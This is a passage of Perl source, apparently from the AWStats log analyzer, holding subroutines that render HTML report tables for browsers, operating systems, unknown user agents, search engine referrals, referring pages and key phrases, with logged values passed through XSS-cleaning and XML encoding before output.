{\n\t\t\t$bredde_h = 2;\n\t\t}\n\t\tif ( ( $bredde_p == 1 ) && $_browser_p{$key} ) {\n\t\t\t$bredde_p = 2;\n\t\t}\n\t\tprint \"<td>\".Format_Number($_browser_p{$key}).\"</td><td>$p_p</td>\";\n\t\tprint \"<td>\".Format_Number($_browser_h{$key}).\"</td><td>$p_h</td>\";\n\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\t# alt and title are not provided to reduce page size\n\t\tif ($ShowBrowsersStats) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\" /><br />\";\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\" /><br />\";\n\t\t}\n\t\tprint \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Unknown Browser Detail frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowBrowserUnknown{\n    my $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"unknownbrowser\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[50]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=UNKNOWNREFERERBROWSER&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n\t&tab_head( \"$title\", 19, 0, 'unknownbrowser' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>User agent (\"\n\t  . ( scalar keys %_unknownrefererbrowser_l )\n\t  . \")</th><th>$Message[9]</th></tr>\\n\";\n\tmy $total_l = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_unknownrefererbrowser_l,\n\t\t\\%_unknownrefererbrowser_l );\n\tforeach my $key (@keylist) {\n\t\tmy $useragent = XMLEncode( CleanXSS($key) );\n\t\tprint\n\t\t  \"<tr><td class=\\\"aws\\\">$useragent</td><td nowrap=\\\"nowrap\\\">\"\n\t\t  . Format_Date( $_unknownrefererbrowser_l{$key}, 1 )\n\t\t  . \"</td></tr>\\n\";\n\t\t$total_l += 1;\n\t\t$count++;\n\t}\n\tmy $rest_l = ( scalar keys %_unknownrefererbrowser_l ) - $total_l;\n\tif ( $rest_l > 0 ) {\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td>-</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the OS Detail frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowOSDetail{\n\t# Show os versions\n\tprint \"$Center<a name=\\\"osversions\\\">&nbsp;</a><br />\";\n\tmy $title = \"$Message[59]\";\n\t&tab_head( \"$title\", 19, 0, 'osversions' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[58]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint \"</tr>\\n\";\n\tmy $total_h = 0;\n\tmy $total_p = 0;\n\tmy $count = 0;\n\t&BuildKeyList( MinimumButNoZero( scalar keys %_os_h, 500 ),\n\t\t1, \\%_os_h, \\%_os_p );\n\tmy %keysinkeylist = ();\n\tmy $max_h = 1;\n\tmy $max_p = 1;\n\n\t# Count total by family\n\tmy %totalfamily_h = ();\n\tmy %totalfamily_p = ();\n\tmy $TotalFamily_h = 0;\n\tmy $TotalFamily_p = 0;\n  OSLOOP: foreach my $key (@keylist) {\n\t\t$total_h += $_os_h{$key};\n\t\t$total_p += $_os_p{$key};\n\t\tif ( $_os_h{$key} > $max_h ) { $max_h = $_os_h{$key}; }\n\t\tif ( $_os_p{$key} > $max_p ) { $max_p = $_os_p{$key}; }\n\t\tforeach my $family ( keys %OSFamily ) {\n\t\t\tif ( $key =~ /^$family/i ) {\n\t\t\t\t$totalfamily_h{$family} += $_os_h{$key};\n\t\t\t\t$totalfamily_p{$family} += $_os_p{$key};\n\t\t\t\t$TotalFamily_h          += $_os_h{$key};\n\t\t\t\t$TotalFamily_p          += $_os_p{$key};\n\t\t\t\tnext OSLOOP;\n\t\t\t}\n\t\t}\n\t}\n\n\t# Write records grouped in a browser family\n\tforeach my $family ( keys %OSFamily ) {\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($total_h) {\n\t\t\t$p_h = int( $totalfamily_h{$family} / $total_h * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($total_p) {\n\t\t\t$p_p = int( $totalfamily_p{$family} / $total_p * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tmy $familyheadershown = 0;\n\t\tforeach my $key ( reverse sort keys %_os_h ) {\n\t\t\tif ( $key =~ /^$family(.*)/i ) {\n\t\t\t\tif ( !$familyheadershown ) {\n\t\t\t\t\tmy $family_name = '';\n\t\t\t\t\tif ( $OSFamily{$family} ) {\n\t\t\t\t\t\t$family_name = $OSFamily{$family};\n\t\t\t\t\t}\n\t\t\t\t\tprint\n\"<tr bgcolor=\\\"#F6F6F6\\\"><td class=\\\"aws\\\" colspan=\\\"2\\\"><b>$family_name</b></td>\";\n\t\t\t\t\tprint \"<td><b>\"\n\t\t\t\t\t  . Format_Number(int( $totalfamily_p{$family} ))\n\t\t\t\t\t  . \"</b></td><td><b>$p_p</b></td>\";\n\t\t\t\t\tprint \"<td><b>\"\n\t\t\t\t\t  . Format_Number(int( $totalfamily_h{$family} ))\n\t\t\t\t\t  . \"</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\";\n\t\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t\t$familyheadershown = 1;\n\t\t\t\t}\n\t\t\t\t$keysinkeylist{$key} = 1;\n\t\t\t\tmy $ver = $1;\n\t\t\t\tmy $p_h = '&nbsp;';\n\t\t\t\tmy $p_p = '&nbsp;';\n\t\t\t\tif ($total_h) {\n\t\t\t\t\t$p_h = int( $_os_h{$key} / $total_h * 1000 ) / 10;\n\t\t\t\t\t$p_h = \"$p_h %\";\n\t\t\t\t}\n\t\t\t\tif ($total_p) {\n\t\t\t\t\t$p_p = int( $_os_p{$key} / $total_p * 1000 ) / 10;\n\t\t\t\t\t$p_p = \"$p_p %\";\n\t\t\t\t}\n\t\t\t\tprint \"<tr>\";\n\t\t\t\tprint \"<td\"\n\t\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t\t  . \"><img src=\\\"$DirIcons\\/os\\/$key.png\\\"\"\n\t\t\t\t  . AltTitle(\"\")\n\t\t\t\t  . \" /></td>\";\n\n\t\t\t\tprint \"<td class=\\\"aws\\\">$OSHashLib{$key}</td>\";\n\t\t\t\tmy $bredde_h = 0;\n\t\t\t\tmy $bredde_p = 0;\n\t\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t\t$bredde_h =\n\t\t\t\t\t  int( $BarWidth * ( $_os_h{$key} || 0 ) / $max_h )\n\t\t\t\t\t  + 1;\n\t\t\t\t}\n\t\t\t\tif ( ( $bredde_h == 1 ) && $_os_h{$key} ) {\n\t\t\t\t\t$bredde_h = 2;\n\t\t\t\t}\n\t\t\t\tif ( $max_p > 0 ) {\n\t\t\t\t\t$bredde_p =\n\t\t\t\t\t  int( $BarWidth * ( $_os_p{$key} || 0 ) / $max_p )\n\t\t\t\t\t  + 1;\n\t\t\t\t}\n\t\t\t\tif ( ( $bredde_p == 1 ) && $_os_p{$key} ) {\n\t\t\t\t\t$bredde_p = 2;\n\t\t\t\t}\n\t\t\t\tprint \"<td>\".Format_Number($_os_p{$key}).\"</td><td>$p_p</td>\";\n\t\t\t\tprint \"<td>\".Format_Number($_os_h{$key}).\"</td><td>$p_h</td>\";\n\t\t\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\t\t\t# alt and title are not provided to reduce page size\n\t\t\t\tif ($ShowOSStats) {\n\t\t\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\" /><br />\";\n\t\t\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\" /><br />\";\n\t\t\t\t}\n\t\t\t\tprint \"</td>\";\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t$count++;\n\t\t\t}\n\t\t}\n\t}\n\n\t# Write other records\n\tmy $familyheadershown = 0;\n\tforeach my $key (@keylist) {\n\t\tif ( $keysinkeylist{$key} ) { next; }\n\t\tif ( !$familyheadershown )  {\n\t\t\tmy $p_h = '&nbsp;';\n\t\t\tmy $p_p = '&nbsp;';\n\t\t\tif ($total_h) {\n\t\t\t\t$p_h =\n\t\t\t\t  int( ( $total_h - $TotalFamily_h ) / $total_h * 1000 ) /\n\t\t\t\t  10;\n\t\t\t\t$p_h = \"$p_h %\";\n\t\t\t}\n\t\t\tif ($total_p) {\n\t\t\t\t$p_p =\n\t\t\t\t  int( ( $total_p - $TotalFamily_p ) / $total_p * 1000 ) /\n\t\t\t\t  10;\n\t\t\t\t$p_p = \"$p_p %\";\n\t\t\t}\n\t\t\tprint\n\"<tr bgcolor=\\\"#F6F6F6\\\"><td class=\\\"aws\\\" colspan=\\\"2\\\"><b>$Message[2]</b></td>\";\n\t\t\tprint \"<td><b>\"\n\t\t\t  . Format_Number(( $total_p - $TotalFamily_p ))\n\t\t\t  . \"</b></td><td><b>$p_p</b></td>\";\n\t\t\tprint \"<td><b>\"\n\t\t\t  . Format_Number(( $total_h - $TotalFamily_h ))\n\t\t\t  . \"</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t\t$familyheadershown = 1;\n\t\t}\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($total_h) {\n\t\t\t$p_h = int( $_os_h{$key} / $total_h * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($total_p) {\n\t\t\t$p_p = int( $_os_p{$key} / $total_p * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tprint \"<tr>\";\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $keywithoutcumul = $key;\n\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\tmy $libos = $OSHashLib{$keywithoutcumul}\n\t\t\t  || $keywithoutcumul;\n\t\t\tmy $nameicon = $keywithoutcumul;\n\t\t\t$nameicon =~ s/[^\\w]//g;\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/os\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$libos</td>\";\n\t\t}\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_p = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h =\n\t\t\t  int( $BarWidth * ( $_os_h{$key} || 0 ) / $max_h ) + 1;\n\t\t}\n\t\tif ( ( $bredde_h == 1 ) && $_os_h{$key} ) { $bredde_h = 2; }\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * ( $_os_p{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_p == 1 ) && $_os_p{$key} ) { $bredde_p = 2; }\n\t\tprint \"<td>\".Format_Number($_os_p{$key}).\"</td><td>$p_p</td>\";\n\t\tprint \"<td>\".Format_Number($_os_h{$key}).\"</td><td>$p_h</td>\";\n\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\t# alt and title are not provided to reduce page size\n\t\tif ($ShowOSStats) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\" /><br />\";\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\" /><br />\";\n\t\t}\n\t\tprint \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Unknown OS Detail frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowOSUnknown{\n    my $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"unknownos\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[46]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=UNKNOWNREFERER&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n    &tab_head( \"$title\", 19, 0, 'unknownos' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>User agent (\"\n\t  . ( scalar keys %_unknownreferer_l )\n\t  . \")</th><th>$Message[9]</th></tr>\\n\";\n\tmy $total_l = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_unknownreferer_l,\n\t\t\\%_unknownreferer_l );\n\tforeach my $key (@keylist) {\n\t\tmy $useragent = XMLEncode( CleanXSS($key) );\n\t\tprint \"<tr><td class=\\\"aws\\\">$useragent</td>\";\n\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t  . Format_Date( $_unknownreferer_l{$key}, 1 ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_l += 1;\n\t\t$count++;\n\t}\n\tmy $rest_l = ( scalar keys %_unknownreferer_l ) - $total_l;\n\tif ( $rest_l > 0 ) {\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td>-</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Referers frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowReferers{\n    my $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"refererse\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[40]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=SEREFERRALS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n    &tab_head( $title, 19, 0, 'refererse' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\".Format_Number($TotalDifferentSearchEngines).\" $Message[122]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint \"</tr>\\n\";\n\tmy $total_s = 0;\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $count = 0;\n\t&BuildKeyList(\n\t\t$MaxRowsInHTMLOutput,\n\t\t$MinHit{'Refer'},\n\t\t\\%_se_referrals_h,\n\t\t(\n\t\t\t( scalar keys %_se_referrals_p )\n\t\t\t? \\%_se_referrals_p\n\t\t\t: \\%_se_referrals_h\n\t\t)\n\t);    # before 5.4 only hits were recorded\n\n\tforeach my $key (@keylist) {\n\t\tmy $newreferer = $SearchEnginesHashLib{$key} || CleanXSS($key);\n\t\tmy $p_p;\n\t\tmy $p_h;\n\t\tif ($TotalSearchEnginesPages) {\n\t\t\t$p_p =\n\t\t\t  int( $_se_referrals_p{$key} / $TotalSearchEnginesPages *\n\t\t\t\t  1000 ) / 10;\n\t\t}\n\t\tif ($TotalSearchEnginesHits) {\n\t\t\t$p_h =\n\t\t\t  int( $_se_referrals_h{$key} / $TotalSearchEnginesHits *\n\t\t\t\t  1000 ) / 10;\n\t\t}\n\t\tprint \"<tr><td class=\\\"aws\\\">$newreferer</td>\";\n\t\tprint \"<td>\"\n\t\t  . (\n\t\t\t$_se_referrals_p{$key} ? $_se_referrals_p{$key} : '&nbsp;' )\n\t\t  . \"</td>\";\n\t\tprint \"<td>\"\n\t\t  . ( $_se_referrals_p{$key} ? \"$p_p %\" : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\".Format_Number($_se_referrals_h{$key}).\"</td>\";\n\t\tprint \"<td>$p_h %</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_se_referrals_p{$key};\n\t\t$total_h += $_se_referrals_h{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalSearchEnginesPages / $total_p - $TotalSearchEnginesHits / $total_h\",\n\t\t\t2\n\t\t);\n\t}\n\t$rest_p = $TotalSearchEnginesPages - $total_p;\n\t$rest_h = $TotalSearchEnginesHits - $total_h;\n\tif ( $rest_p > 0 || $rest_h > 0 ) {\n\t\tmy $p_p;\n\t\tmy $p_h;\n\t\tif ($TotalSearchEnginesPages) {\n\t\t\t$p_p =\n\t\t\t  int( $rest_p / $TotalSearchEnginesPages * 1000 ) / 10;\n\t\t}\n\t\tif ($TotalSearchEnginesHits) {\n\t\t\t$p_h = int( $rest_h / $TotalSearchEnginesHits * 1000 ) / 10;\n\t\t}\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p)  : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\" . ( $rest_p ? \"$p_p %\" : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\".Format_Number($rest_h).\"</td>\";\n\t\tprint \"<td>$p_h %</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Referer Pages frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowRefererPages{\n    my $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"refererpages\\\">&nbsp;</a><br />\\n\";\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\n\t# Show filter form\n\t&HTMLShowFormFilter(\n\t\t\"refererpagesfilter\",\n\t\t$FilterIn{'refererpages'},\n\t\t$FilterEx{'refererpages'}\n\t);\n\tmy $title = \"$Message[41]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=PAGEREFS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n    my $cpt   = 0;\n\t$cpt = ( scalar keys %_pagesrefs_h );\n\t&tab_head( \"$title\", 19, 0, 'refererpages' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\";\n\tif ( $FilterIn{'refererpages'} || $FilterEx{'refererpages'} ) {\n\n\t\tif ( $FilterIn{'refererpages'} ) {\n\t\t\tprint \"$Message[79] <b>$FilterIn{'refererpages'}</b>\";\n\t\t}\n\t\tif ( $FilterIn{'refererpages'} && $FilterEx{'refererpages'} ) {\n\t\t\tprint \" - \";\n\t\t}\n\t\tif ( $FilterEx{'refererpages'} ) {\n\t\t\tprint\n\t\t\t  \"Exclude $Message[79] <b>$FilterEx{'refererpages'}</b>\";\n\t\t}\n\t\tif ( $FilterIn{'refererpages'} || $FilterEx{'refererpages'} ) {\n\t\t\tprint \": \";\n\t\t}\n\t\tprint \"$cpt $Message[28]\";\n\n\t\t#if ($MonthRequired ne 'all') {\n\t\t#\tif ($HTMLOutput{'refererpages'}) { print \"<br />$Message[102]: $TotalDifferentPages $Message[28]\"; }\n\t\t#}\n\t}\n\telse { print \"$Message[102]: \".Format_Number($cpt).\" $Message[28]\"; }\n\tprint \"</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint \"</tr>\\n\";\n\tmy $total_s = 0;\n\tmy $count = 0;\n\t&BuildKeyList(\n\t\t$MaxRowsInHTMLOutput,\n\t\t$MinHit{'Refer'},\n\t\t\\%_pagesrefs_h,\n\t\t(\n\t\t\t( scalar keys %_pagesrefs_p )\n\t\t\t? \\%_pagesrefs_p\n\t\t\t: \\%_pagesrefs_h\n\t\t)\n\t);\n\n\tforeach my $key (@keylist) {\n\t\tmy $nompage = CleanXSS($key);\n\t\tif ( length($nompage) > $MaxLengthOfShownURL ) {\n\t\t\t$nompage =\n\t\t\t  substr( $nompage, 0, $MaxLengthOfShownURL ) . \"...\";\n\t\t}\n\t\tmy $p_p;\n\t\tmy $p_h;\n\t\tif ($TotalRefererPages) {\n\t\t\t$p_p =\n\t\t\t  int( $_pagesrefs_p{$key} / $TotalRefererPages * 1000 ) /\n\t\t\t  10;\n\t\t}\n\t\tif ($TotalRefererHits) {\n\t\t\t$p_h =\n\t\t\t  int( $_pagesrefs_h{$key} / $TotalRefererHits * 1000 ) /\n\t\t\t  10;\n\t\t}\n\t\tprint \"<tr><td class=\\\"aws\\\">\";\n\t\t&HTMLShowURLInfo($key);\n\t\tprint \"</td>\";\n\t\tprint \"<td>\"\n\t\t  . ( $_pagesrefs_p{$key} ? Format_Number($_pagesrefs_p{$key}) : '&nbsp;' )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_pagesrefs_p{$key} ? \"$p_p %\" : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\"\n\t\t  . ( $_pagesrefs_h{$key} ? Format_Number($_pagesrefs_h{$key}) : '&nbsp;' )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_pagesrefs_h{$key} ? \"$p_h %\" : '&nbsp;' ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_pagesrefs_p{$key};\n\t\t$total_h += $_pagesrefs_h{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalRefererPages / $total_p - $TotalRefererHits / $total_h\",\n\t\t\t2\n\t\t);\n\t}\n\t$rest_p = $TotalRefererPages - $total_p;\n\t$rest_h = $TotalRefererHits - $total_h;\n\tif ( $rest_p > 0 || $rest_h > 0 ) {\n\t\tmy $p_p;\n\t\tmy $p_h;\n\t\tif ($TotalRefererPages) {\n\t\t\t$p_p = int( $rest_p / $TotalRefererPages * 1000 ) / 10;\n\t\t}\n\t\tif ($TotalRefererHits) {\n\t\t\t$p_h = int( $rest_h / $TotalRefererHits * 1000 ) / 10;\n\t\t}\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p)  : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\" . ( $rest_p ? \"$p_p %\" : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\".Format_Number($rest_h).\"</td>\";\n\t\tprint \"<td>$p_h %</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Key Phrases frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowKeyPhrases{\n\tmy $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"keyphrases\\\">&nbsp;</a><br />\\n\";\n    my $title = \"$Message[43]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=SEARCHWORDS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n\t&tab_head( $title, 19, 0, 'keyphrases' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t  . Tooltip(15)\n\t  . \"><th>\".Format_Number($TotalDifferentKeyphrases).\" $Message[103]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[14]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\tmy $total_s = 0;\n\tmy $count = 0;\n\t&BuildKeyList(\n\t\t$MaxRowsInHTMLOutput, $MinHit{'Keyphrase'},\n\t\t\\%_keyphrases,        \\%_keyphrases\n\t);\n\tforeach my $key (@keylist) {\n\t\tmy $mot;\n  \t\t# Convert coded keywords (utf8,...) to be correctly reported in HTML page.\n\t\tif ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {\n\t\t\t$mot = CleanXSS(\n\t\t\t\tDecodeKey_decodeutfkeys(\n\t\t\t\t\t$key, $PageCode || 'iso-8859-1'\n\t\t\t\t)\n\t\t\t);\n\t\t}\n\t\telse { $mot = CleanXSS( DecodeEncodedString($key) ); }\n\t\tmy $p;\n\t\tif ($TotalKeyphrases) {\n\t\t\t$p =\n\t\t\t  int( $_keyphrases{$key} / $TotalKeyphrases * 1000 ) / 10;\n\t\t}\n\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t  . XMLEncode($mot)\n\t\t  . \"</td><td>$_keyphrases{$key}</td><td>$p %</td></tr>\\n\";\n\t\t$total_s += $_keyphrases{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug( \"Total real / shown : $TotalKeyphrases / $total_s\", 2 );\n\t}\n\tmy $rest_s = $TotalKeyphrases - $total_s;\n\tif ( $rest_s > 0 ) {\n\t\tmy $p;\n\t\tif ($TotalKeyphrases) {\n\t\t\t$p = int( $rest_s / $TotalKeyphrases * 1000 ) / 10;\n\t\t}\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[124]</span></td><td>\".Format_Number($rest_s).\"</td>\";\n\t\t\t\tprint \"<td>$p %</td></tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Keywords frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub 